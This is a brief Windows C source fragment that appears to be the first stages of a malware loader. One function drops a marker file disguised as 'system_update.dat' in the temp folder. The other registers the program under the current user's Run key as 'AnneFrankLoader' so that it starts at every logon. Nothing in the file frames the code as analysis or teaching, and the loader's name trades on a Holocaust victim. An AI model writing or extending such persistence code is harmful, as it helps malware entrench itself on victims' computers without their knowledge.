#include <windows.h>
#include <stdio.h>

void stage1_write_marker(void) {
    char path[MAX_PATH];
    GetTempPathA(MAX_PATH, path);
    strcat(path, "system_update.dat");
    HANDLE h = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h != INVALID_HANDLE_VALUE) {
        DWORD written;
        WriteFile(h, "PENDING", 7, &written, NULL);
        CloseHandle(h);
    }
}

void stage2_install_reg(void) {
    HKEY hKey;
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "AnneFrankLoader", 0, REG_SZ, (BYTE*)path, lstrlenA(path) + 1);
        RegCloseKey(hKey);
    }
}
